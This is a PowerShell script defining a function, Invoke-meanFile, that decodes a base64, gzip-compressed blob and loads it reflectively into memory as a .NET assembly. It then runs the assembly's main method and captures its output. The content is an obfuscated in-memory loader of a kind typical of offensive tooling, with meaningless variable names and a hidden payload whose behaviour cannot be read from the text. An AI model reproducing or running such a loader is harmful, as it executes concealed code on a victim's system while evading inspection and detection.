function Invoke-meanFile
{
  
    $abcdef=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("H4sIAAAAAAAEAO1WPWwcRRR+u75Yjh1biSB/BclkL0EhIusztkSI7MS+nJ042LHlcxwJIZK9vfF5YXfmmNm93KVAbviTUJQKJEAoBRESQogCiSiAkJAo06SiTEFFEyoKCsKbmb2f+IziBtHkrefNzJs33/ve/J3nX7kBPQCQwfLwIcBtMDIJj5d1LEMH7wzBt9vvHrptzd09tLwWSFIVvCK8iPgeYzwmJUpEwkjASGGhSCJepu7gYP/hFGNxGmDO6oGDP1dLTdz7YFsD1oAh1Wdsn2VRkSaxSdO2jQtAu9akbNPsgcm3AXbqv3bdqkx8xH05hbyfgW65ArBjC2vRJaRFXUsf9s919N2Y1mOsP+8xvjoBuwviiiuk8CHlhhyhNy0dguZJV9CQ+ynXKynWji6//Eaa61lTn9NTtkGIQX/DuRbo0rvR/3FyHgROq4pRVEcxt/5njx2wjyL5/mOQL57PWxrZUKuNuTl3NDc68pKyYGzUfTicfQsgxvpX7GeLsQhYRSqPOdssQfZiET6wzT5mz16cLWD9qW1yyOZD3jxIKo2zuwG2q85fR0Zhj8lrW7o8tsmxtfQWNLegP2XZCzl4DnUFzqJ+F3U/3IFbqH9BDekcpdW3E/ZqdNVeJMr+IbyosXzde2ffOPqYSHnYBePwNOwHZTsE97C1XbddGMCdd+EpjJxZ37i+e6HjrGskDb3BdqvdGZ/n5SSkpyCiHpsJQurSOm11IJI+F2FQgmJDxjSChdLr1I9h3gsYuH7MBXgCV9+MuksJi4OIumd4VMXZokhFLfCpBGPw4oCzJRp6dd2SUzFuXimJKaQTlRsOlYIwiBvt0RT9UsDK/Kp0Z7iIJMxTKb0KzfM6FAIv5JUlKpMwhuIav4p5jRQgAAoS8w9Qx1hXwAMG17BVgj/RRkFg+wxwKGPbGlhBTwEJqMP00Zc91z/54bX89btff/wFJ/eg77trr67sH7v/Pu6f9cxQDwErQyyrrxfsXbuHhvBcmut8QO3usr3nkvCqFzibrvu0qpJdXhPI3apn20t/vflmbSLrLb/LZ7iYrlO94no3KHXLYajHHh4BMrk5wH8itr5TBOntw/qEeU07xNzexX+xr21iV7LB2LLfwHJz0tzrpvyBL9TvVrs/Z4+hXoEiXEY9DUvYmoUFuID9WdQz2FbyY+bB303cTjmd1hnoHi1o2wqeGoE4Ab4/FDEZrOKJUXJYz1rGUXWuJI57eM4CHGUpwjeZryyFUUS7wBGGZ7Ab6T3tk2t9Y3g+c2h/HtfbavkX9Gn2NU71kTgESw6PX9t3RZ9t2eGTwxejXfDawyD6Kw6x9mXIPcT18iDCPmitsmoiuljqegTgqOY1h72KnqVuUBUamlkFdzlOORV0jIXUHqQxmohsS7HGdF6LiKFuaYL5x13ZbczthJ4zhR7qjke4miGyI4+dp+TB9z+Nn65HIalRIfHaTjgjbs4hlPm8jL8zE87F5ZnjJxwiY4+V8dVhdMJpUOmcPjXYP+5JSaNS2CAIwOSEkwh2UvprNPLk8SjwBZd8NT7u8+ikJyO3NuKQyGPBKpXxSmc0hCKkBTZbpvg2xo1HGKnPIcyLMPx8Y6paDQNfv6muV606wwYhFomMZ9kq3yKfF0xknCmpnwiMmfbRIuibCfKk5UUR1PBpr1C5RdRRp4XSiYNPmp8oxnO0RkMSKj3heHKW1fgbVDgkCaZ8/OnAAKteKGmalAYZ3oRNk/rwI9zHh1uLoDZouLmo2Ol6Cp7IZkLM/2I3R/9vIk/k/5B/ALL5vhsADgAA"))
    $decompressedRawFile = New-Object IO.Compression.GzipStream($abcdef,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressedRawFile.CopyTo( $output )
    [byte[]] $asdawdasdaw = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($asdawdasdaw)
    
    $adwadsdas = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [meanFile]::main(1)

    [Console]::SetOut($adwadsdas)
    $Results = $StringWriter.ToString()
    $Results
}